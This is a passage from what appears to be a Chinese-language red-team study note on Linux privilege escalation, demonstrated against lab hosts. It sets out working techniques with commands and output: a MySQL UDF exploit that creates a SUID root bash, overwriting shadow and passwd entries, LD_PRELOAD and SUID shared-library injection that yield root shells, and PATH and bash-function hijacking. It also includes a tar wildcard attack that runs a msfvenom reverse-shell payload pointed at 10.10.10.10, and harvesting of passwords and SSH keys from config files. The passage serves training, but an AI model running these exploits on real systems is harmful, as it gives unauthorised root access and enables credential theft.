+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+-----+---------+----------+</span><br><span class="hljs-operator">|</span> name     <span class="hljs-operator">|</span> ret <span class="hljs-operator">|</span> dl      <span class="hljs-operator">|</span> type     <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+-----+---------+----------+</span><br><span class="hljs-operator">|</span> sys_eval <span class="hljs-operator">|</span>   <span class="hljs-number">0</span> <span class="hljs-operator">|</span> udf.dll <span class="hljs-operator">|</span> <span class="hljs-keyword">function</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+-----+---------+----------+</span><br></code></pre></td></tr></table></figure>
+
+<p>这里的 sys_eval 支持自定义，接着就可以通过创建的这个函数来执行系统命令了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql &gt; <span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<h5 id="编译动态链接库"><a href="#编译动态链接库" class="headerlink" title="编译动态链接库"></a>编译动态链接库</h5><p>使用的脚本：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/1518">MySQL 4.x&#x2F;5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2) - Linux local Exploit (exploit-db.com)</a></p>
+<h6 id="准备利用文件"><a href="#准备利用文件" class="headerlink" title="准备利用文件"></a>准备利用文件</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -g -c raptor_udf2.c -fPIC<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>fPIC</code> ：这个选项告诉编译器生成位置无关代码（Position-Independent Code，PIC）。这种代码可以在内存中的任何位置执行，这对于创建共享库（如动态链接库）非常有用，因为它们可以被多个程序在运行时共享</li>
+<li><code>-c</code> ：这个选项指示编译器仅编译源代码，但不进行链接。编译器将生成一个目标文件（object file），通常具有.o 扩展名。这对于将多个源文件分别编译成目标文件，然后链接为一个可执行程序或库很有用。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li><code>-shared</code> : 这个选项指示编译器生成一个共享库（shared library）文件，而不是一个可执行文件。共享库允许多个程序共享相同的库代码，从而减少了程序的大小和内存占用。</li>
+<li><code>-Wl</code> : 该选项告诉编译器将后面的选项传递给链接器。在这里，它用于传递 <code>- soname,raptor_udf2.so</code> 选项。(Warning and Link)</li>
+<li><code>-soname,raptor_udf2.so</code> : 这个选项设置了生成的共享库的“soname”（共享对象名称）。soname 是一个简短的标识符，用于在运行时链接器（如 ld.so 或 ld-linux.so）解析共享库依赖关系时引用该共享库。通常，soname 包括主版本号，以便在升级库时保持二进制兼容性。</li>
+<li><code>-lc</code> : 这个选项告诉链接器链接 C 标准库（libc）。这通常是编译 C 程序所必需的，因为它提供了基本的系统函数，如 malloc、free 等。</li>
+</ol>
+<p>利用过程</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs SQL">use mysql;<br><br># &quot;foo&quot; 在计算机编程和网络领域中是一个常用的占位符名称<br># <span class="hljs-type">BLOB</span> 表示 &quot;Binary Large Object&quot;，它可以存储大量的二进制数据<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> foo(line <span class="hljs-type">blob</span>);<br><br># 装载动态链接库<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> foo <span class="hljs-keyword">values</span>(load_file(<span class="hljs-string">&#x27;/home/user/tools/mysqludf/</span><br><span class="hljs-string">raptor_udf2.so&#x27;</span>));<br><br># 写入到插件目录中<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> foo <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;<br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 找plugin目录中的.so文件<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> do_system <span class="hljs-keyword">returns</span> <span class="hljs-type">integer</span> soname <span class="hljs-string">&#x27;raptor_udf2.so&#x27;</span>;<br><br># 查询已有udf<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> mysql.func;<br><br># 提权<br><span class="hljs-keyword">select</span> do_system(<span class="hljs-string">&#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>如果 dumpfile 失败，对于 AppArmor（如果您使用的是基于 Debian 的系统，如 Ubuntu），编辑 <code>/etc/apparmor.d/usr.sbin.mysqld</code> 文件，找到以下行：<code>/usr/sbin/mysqld &#123;</code>，在此行下方添加以下内容：<code>/usr/lib/mysql/plugin/**rw,</code></p>
+<h3 id="可读-shadow-文件利用提权"><a href="#可读-shadow-文件利用提权" class="headerlink" title="可读 shadow 文件利用提权"></a>可读 shadow 文件利用提权</h3><p>转存哈希信息后，使用 john 进行爆破</p>
+<h3 id="可写-shadow-文件利用提权"><a href="#可写-shadow-文件利用提权" class="headerlink" title="可写 shadow 文件利用提权"></a>可写 shadow 文件利用提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 操作前备份，防止有回退的需求</span><br><span class="hljs-built_in">cp</span> /etc/shadow /tmp/shadow.bak<br><br><span class="hljs-comment"># 指定密码哈希类型和新密码，得到字符串后将其替换root的密码哈希即可</span><br>mkpasswd -m sha-512 passwd123<br></code></pre></td></tr></table></figure>
+
+<h3 id="可写-passwd-提权"><a href="#可写-passwd-提权" class="headerlink" title="可写 passwd 提权"></a>可写 passwd 提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 提前备份</span><br><span class="hljs-built_in">cp</span> /etc/passwd /tmp/passwd.bak<br><br><span class="hljs-comment"># 生成密码哈希，得到字符串后将其替换root的密码哈希或者x即可</span><br>openssl passwd passwd123<br></code></pre></td></tr></table></figure>
+
+<h3 id="sudo-环境变量提权"><a href="#sudo-环境变量提权" class="headerlink" title="sudo 环境变量提权"></a>sudo 环境变量提权</h3><p>LD_PRELOAD 是允许任何程序使用共享库的功能。如果启用了“env_keep”选项，我们可以生成一个共享库，该共享库将在运行程序之前加载和执行。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 检查 LD_PRELOAD（带有 env_keep 选项）</span><br>user@debian:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> user on this host:<br>env_reset, env_keep+=LD_PRELOAD<br>User user may run the following commands on this host:<br>(root) NOPASSWD: /usr/sbin/iftop<br>(root) NOPASSWD: /usr/bin/find<br><br><span class="hljs-comment"># 编写一个简单的 C 代码作为共享对象（.so 扩展名）文件编译</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/types.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br>void <span class="hljs-function"><span class="hljs-title">_init</span></span>() &#123;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>setgid(0);<br>setuid(0);<br>system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># gcc 编译为共享对象文件</span><br>gcc -fPIC -shared -o shell.so shell.c -nostartfiles<br><br><span class="hljs-comment"># 运行用户拥有sudo权限的程序，并且使用此共享对象文件</span><br>sudo LD_PRELOAD=/home/user/ldpreload/shell.so find<br></code></pre></td></tr></table></figure>
+
+<h3 id="自动任务文件权限提权"><a href="#自动任务文件权限提权" class="headerlink" title="自动任务文件权限提权"></a>自动任务文件权限提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看自动任务文件</span><br><span class="hljs-built_in">cat</span> /etc/crontab<br><br><span class="hljs-comment"># 根据自动任务文件内容进行下一步考虑，如果是以root权限定时运行脚本，则可以考虑对脚本进行写入，来反弹shell或者其他提权手法</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="自动任务-PATH-环境变量提权"><a href="#自动任务-PATH-环境变量提权" class="headerlink" title="自动任务 PATH 环境变量提权"></a>自动任务 PATH 环境变量提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 如果当前用户家目录被写入了crontab中的环境变量里。且自动任务的脚本不是绝对路径，则可以创建一个同名文件来替换执行，需要补充的是crontab中的环境变量的顺序决定了查找相对路径文件的次序</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="自动任务通配符提权"><a href="#自动任务通配符提权" class="headerlink" title="自动任务通配符提权"></a>自动任务通配符提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 自动任务调用的脚本中使用了tar命令并包含了通配符</span><br>user@RedteamNotes:~$ <span class="hljs-built_in">cat</span> /usr/local/bin/compress.sh<br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-built_in">cd</span> /home/user<br>tar czf /tmp/backup.tar.gz *<br><br><span class="hljs-comment"># 生成反弹shell的可执行文件，将其上传到tar命令操作的目录中</span><br>┌──(kali㉿kali)-[~/Musics/PrivEscaLabs]<br>└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 - f elf -o shell.elf<br>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload<br>[-] No <span class="hljs-built_in">arch</span> selected, selecting <span class="hljs-built_in">arch</span>: x64 from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 74 bytes<br>Final size of elf file: 194 bytes<br>Saved as: shell.elf<br><br><span class="hljs-comment"># 为可执行文件添加运行权限</span><br>user@RedteamNotes:~$ <span class="hljs-built_in">chmod</span> +x shell.elf<br><br><span class="hljs-comment"># 创建特殊的文件名，使得通配符在和tar命令结合的情况下，执行指定的文件</span><br>user@RedteamNotes:~$ <span class="hljs-built_in">touch</span> /home/user/--checkpoint=1<br>user@RedteamNotes:~$ <span class="hljs-built_in">touch</span> /home/user/--checkpoint-action=<span class="hljs-built_in">exec</span>=shell.elf<br></code></pre></td></tr></table></figure>
+
+<h3 id="SUID-可执行文件已知利用提权"><a href="#SUID-可执行文件已知利用提权" class="headerlink" title="SUID 可执行文件已知利用提权"></a>SUID 可执行文件已知利用提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Musics/PrivEscaLabs]<br>└─$ searchsploit exim 4.84<br>-----------------------------------------------------------------------------<br>Exploit Title<br>| Path<br>-----------------------------------------------------------------------------<br>Exim - <span class="hljs-string">&#x27;perl_startup&#x27;</span> Local Privilege Escalation (Metasploit)<br>| linux/local/39702.rb<br>Exim 4.84-3 - Local Privilege Escalation<br>| linux/local/39535.sh<br>Exim &lt; 4.86.2 - Local Privilege Escalation<br>| linux/local/39549.txt<br>Exim &lt; 4.90.1 - <span class="hljs-string">&#x27;base64d&#x27;</span> Remote Code Execution<br>| linux/remote/44571.py<br>PHPMailer &lt; 5.2.20 with Exim MTA - Remote Code Execution<br>| php/webapps/42221.py<br>-----------------------------------------------------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>
+
+<h3 id="SUID-共享库注入提权"><a href="#SUID-共享库注入提权" class="headerlink" title="SUID 共享库注入提权"></a>SUID 共享库注入提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 根据文件名也可以猜测出一些东西，</span><br>user@RedteamNotes:~$ /usr/local/bin/suid-so<br>Calculating something, please <span class="hljs-built_in">wait</span>...<br>[===================================================================&gt;]<br>99 %<br>Done.<br><br><span class="hljs-comment"># 使用strings命令查看该文件，发现了一个路径/home/user/.config/libcalc.so</span><br>strings /usr/local/bin/suid-so<br><br><span class="hljs-comment"># 进一步查看</span><br>user@RedteamNotes:~$ strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep <span class="hljs-string">&#x27;/home/user&#x27;</span><br>open(<span class="hljs-string">&quot;/home/user/.config/libcalc.so&quot;</span>, O_RDONLY) = -1 ENOENT (No such file<br><br><span class="hljs-comment"># 按照上述路径，编译一个同名的动态链接库</span><br>user@RedteamNotes:~/.config$ vim libcalc.c<br>user@RedteamNotes:~/.config$ <span class="hljs-built_in">cat</span> libcalc.c<br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br>static void inject() __attribute__((constructor));<br>void <span class="hljs-function"><span class="hljs-title">inject</span></span>() &#123;<br>	setuid(0);<br>	system(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br>&#125;<br><br><span class="hljs-comment"># 编译</span><br>user@RedteamNotes:~/.config$ gcc -shared -fPIC -o libcalc.so libcalc.c<br><br><span class="hljs-comment"># 执行</span><br>user@RedteamNotes:~/.config$ /usr/local/bin/suid-so<br>Calculating something, please <span class="hljs-built_in">wait</span>...<br>bash-4.1<span class="hljs-comment"># whoami</span><br>root<br><br></code></pre></td></tr></table></figure>
+
+<p><code>static void inject() __attribute__((constructor));</code>：声明一个名为 inject 的静态函数，并使用 GCC 的 <code>__attribute__((constructor))</code> 属性。这个属性使得在程序或动态库加载时自动执行 inject 函数，而不需要显式调用它。</p>
+<h3 id="SUID-环境变量利用提权"><a href="#SUID-环境变量利用提权" class="headerlink" title="SUID 环境变量利用提权"></a>SUID 环境变量利用提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 尝试运行有SUID的程序</span><br>user@RedteamNotes:~$ /usr/local/bin/suid-env<br>Starting web server: apache2httpd (pid 1596) already running<br>.<br><br><span class="hljs-comment"># 查看可见字符，得到了一个命令</span><br>user@RedteamNotes:~$ strings /usr/local/bin/suid-env<br>/lib64/ld-linux-x86-64.so.2<br>5q;Xq<br>__gmon_start__<br>libc.so.6<br>setresgid<br>setresuid<br>system<br>__libc_start_main<br>GLIBC_2.2.5<br>fff.<br>fffff.<br>l$ L<br>t$(L<br>|<span class="hljs-variable">$0H</span><br>service apache2 start<br><br><span class="hljs-comment"># 由于使用的命令并不是绝对路径，因此可以使用环境变量来劫持，编译一个同名的可执行文件，然后将当前目录写入到环境变量中，这样程序运行的时候会优先从当前目录下寻找service程序</span><br>user@RedteamNotes:~$ vim service.c<br>user@RedteamNotes:~$ gcc -o service service.c<br>user@RedteamNotes:~$ <span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br>user@RedteamNotes:~$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin<br>:/usr/local/sbin<br></code></pre></td></tr></table></figure>
+
+<h3 id="巧用-SUID-shell-功能提权-1"><a href="#巧用-SUID-shell-功能提权-1" class="headerlink" title="巧用 SUID-shell 功能提权 #1"></a>巧用 SUID-shell 功能提权 #1</h3><p>bash 版本小于 4.2 时，可以定义函数，并且用路径的组合作为函数名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看可见字符，发现一个带有绝对路径的程序运行</span><br>user@RedteamNotes:~$ strings /usr/local/bin/suid-env2<br>/lib64/ld-linux-x86-64.so.2<br>__gmon_start__<br>libc.so.6<br>setresgid<br>setresuid<br>system<br>__libc_start_main<br>GLIBC_2.2.5<br>fff.<br>fffff.<br>l$ L<br>t$(L<br>|<span class="hljs-variable">$0H</span><br>/usr/sbin/service apache2 start<br><br><span class="hljs-comment"># 查看bash版本，小于4.2则可能存在这个提权利用</span><br>user@RedteamNotes:~$ /bin/bash --version<br>GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)<br>Copyright (C) 2009 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later<br><br><span class="hljs-comment"># 定义包含路径的函数</span><br>user@RedteamNotes:~$ <span class="hljs-keyword">function</span> /usr/sbin/service &#123; /bin/bash -p; &#125;<br><br><span class="hljs-comment"># 将该函数或可执行文件导出为环境变量</span><br>user@RedteamNotes:~$ <span class="hljs-built_in">export</span> -f /usr/sbin/service<br><br><span class="hljs-comment"># 执行SUID的程序</span><br>user@RedteamNotes:~$ /usr/local/bin/suid-env2<br>root@RedteamNotes:~<span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure>
+
+<h3 id="巧用-SUID-shell-功能提权-2"><a href="#巧用-SUID-shell-功能提权-2" class="headerlink" title="巧用 SUID-shell 功能提权 #2"></a>巧用 SUID-shell 功能提权 #2</h3><p>bash 版本低于 4.4 时，可以在调试中对环境变量进行设置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span> -i SHELLOPTS=xtrace PS4=<span class="hljs-string">&#x27;$(cp /bin/bash /tmp/rootbash; chmod +xs</span><br><span class="hljs-string">/tmp/rootbash)&#x27;</span> /usr/local/bin/suid-env2<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-i</code> 参数表示 “ignore environment”，即忽略现有的环境变量。</li>
+<li><code>xtrace</code> 选项被设置， shell 执行每个命令之前都打印该命令。PS4 环境变量定义了这个打印输出的格式。PS4 被设置为一个命令序列，该命令序列首先会复制 <code>/bin/bash</code> 到&#x2F; <code>tmp/rootbash</code>，然后将新文件设置为 SUID 和可执行状态。</li>
+<li><code>SHELLOPTS</code> 是一个只读的 Bash 环境变量，用于列出当前已启用的 shell 选项。</li>
+<li><code>PS </code> 代表 “Prompt String”。这是用于定义 shell 提示符的环境变量。</li>
+</ul>
+<h3 id="密码和密钥历史文件提权"><a href="#密码和密钥历史文件提权" class="headerlink" title="密码和密钥历史文件提权"></a>密码和密钥历史文件提权</h3><p>注意家目录下的历史文件</p>
+<h3 id="密码和密钥配置文件查看提权"><a href="#密码和密钥配置文件查看提权" class="headerlink" title="密码和密钥配置文件查看提权"></a>密码和密钥配置文件查看提权</h3><p>配置文件中可能有用户名和密码，因此要有足够的敏感度，对这方面的文件不能有遗漏</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@debian:~$ <span class="hljs-built_in">ls</span> -liha<br>total 56K<br>155042 drwxr-xr-x 5 user user 4.0K May 15 2020 .<br>155041 drwxr-xr-x 3 root root 4.0K May 15 2017 ..<br>155056 -rw------- 1 user user 140 May 15 2020 .bash_history<br>155045 -rw-r--r-- 1 user user 220 May 12 2017 .bash_logout<br>155043 -rw-r--r-- 1 user user 3.2K May 14 2017 .bashrc<br>375363 drwxr-xr-x 2 user user 4.0K May 13 2017 .irssi<br>155071 drwx------ 2 user user 4.0K May 15 2020 .john<br>156485 -rw------- 1 user user 137 May 15 2017 .lesshst<br>155047 -rw-r--r-- 1 user user 212 May 15 2017 myvpn.ovpn<br>155048 -rw------- 1 user user 11 May 15 2020 .nano_history<br>155044 -rw-r--r-- 1 user user 725 May 13 2017 .profile<br>155049 drwxr-xr-x 8 user user 4.0K May 15 2020 tools<br>155057 -rw------- 1 user user 6.2K May 15 2020 .viminfo<br><br>user@debian:~$ <span class="hljs-built_in">cat</span> myvpn.ovpn<br>client<br>dev tun<br>proto udp<br>remote 10.10.10.10 1194<br>resolv-retry infinite<br>nobind<br>persist-key<br>persist-tun<br>ca ca.crt<br>tls-client<br>remote-cert-tls server<br>auth-user-pass /etc/openvpn/auth.txt<br>comp-lzo<br>verb 1<br>reneg-sec 0<br><br>user@debian:~$ <span class="hljs-built_in">cat</span> /etc/openvpn/auth.txt<br>root<br>password123<br>user@debian:~$ su<br>Password:<br>root@debian:<br></code></pre></td></tr></table></figure>
+
+<h3 id="SSH-密钥敏感信息提权"><a href="#SSH-密钥敏感信息提权" class="headerlink" title="SSH 密钥敏感信息提权"></a>SSH 密钥敏感信息提权</h3><p>.ssh 文件可能在用户家目录，也可能在根目录下，并且其中可能存在私钥泄露，并且注意本地创建文件写入私钥内容后文件权限要更改为 600，否则无法登录，除此之外还能会出现算法和签名不匹配的情况，因此有时需要指定算法类型</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">user@debian:~$ <span class="hljs-built_in">ls</span> -liah /.ssh<br>total 12K<br>1175041 drwxr-xr-x 2 root root 4.0K Aug 25 2019 .<br>2 drwxr-xr-x 22 root root 4.0K Aug 25 2019 ..<br>1175042 -rw-r--r-- 1 root root 1.7K Aug 25 2019 root_key<br>┌──(kali㉿kali)-[~/Musics/PrivEscaLabs]<br>└─$ ssh -i id_rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.174.100<br></code></pre></td></tr></table></figure>
+
+<h3 id="NFS-提权"><a href="#NFS-提权" class="headerlink" title="NFS 提权"></a>NFS 提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># /etc/exports文件中可以看到更详尽的NFS设置</span><br>user@RedteamNotes:~$ <span class="hljs-built_in">cat</span> /etc/exports<br><span class="hljs-comment"># /etc/exports: the access control list for filesystems which may be</span><br>exported<br><span class="hljs-comment"># to NFS clients. See exports(5).</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example for NFSv2 and NFSv3:</span><br><span class="hljs-comment"># /srv/homes hostname1(rw,sync,no_subtree_check)</span><br>hostname2(ro,<span class="hljs-built_in">sync</span>,no_subtree_check)<br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Example for NFSv4:</span><br><span class="hljs-comment"># /srv/nfs4 gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span><br><span class="hljs-comment"># /srv/nfs4/homes gss/krb5i(rw,sync,no_subtree_check)</span><br><span class="hljs-comment">#</span><br>/tmp *(rw,<span class="hljs-built_in">sync</span>,insecure,no_root_squash,no_subtree_check)<br><span class="hljs-comment">#/tmp *(rw,sync,insecure,no_subtree_check)</span><br><br><span class="hljs-comment"># 发现存在 no_root_squash，它的作用是允许 root 用户在 NFS 客户端机器上拥有和在 NFS 服务器上相同的权限。那么我们可以在把本机上切换到 root 用户，挂载后将本地 root 用户的程序复制到 NFS 目录中</span><br><span class="hljs-comment"># 